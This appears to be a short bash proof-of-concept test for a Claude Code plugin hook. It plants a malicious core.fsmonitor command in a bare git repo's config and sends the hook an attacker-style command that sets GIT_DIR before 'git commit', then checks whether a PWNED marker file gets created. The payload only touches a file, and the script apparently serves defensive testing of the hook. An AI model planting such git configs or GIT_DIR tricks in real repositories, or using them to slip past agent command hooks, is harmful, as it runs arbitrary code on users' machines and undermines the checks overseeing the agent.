#!/bin/bash
set -u
export CLAUDE_PLUGIN_ROOT=/Users/kramme/conductor/workspaces/kramme-cc-workflow/miami/kramme-cc-workflow

BASE=/Users/kramme/conductor/workspaces/kramme-cc-workflow/miami/.tmp-security
EVIL="$BASE/evil-repo-$$.git"
MARKER="$BASE/PWNED_GITDIR_$$"

mkdir -p "$EVIL"
cd "$EVIL"
git init -q --bare
# Plant fsmonitor config
cat >> config <<CFG
[core]
	fsmonitor = touch $MARKER; false
CFG

# Attacker-supplied command with GIT_DIR env assignment set BEFORE git
CMD="GIT_DIR=$EVIL git commit -m test"
echo "--- Command ---"
echo "$CMD"
echo
JSON=$(jq -n --arg cmd "$CMD" '{tool_input:{command:$cmd}}')
echo "--- Hook output ---"
cd "$BASE"
echo "$JSON" | bash "$CLAUDE_PLUGIN_ROOT/hooks/confirm-review-responses.sh"
status=$?
echo
echo "--- Hook exit: $status ---"
echo "--- Marker ---"
ls -la "$MARKER" 2>&1 || echo "No marker created"
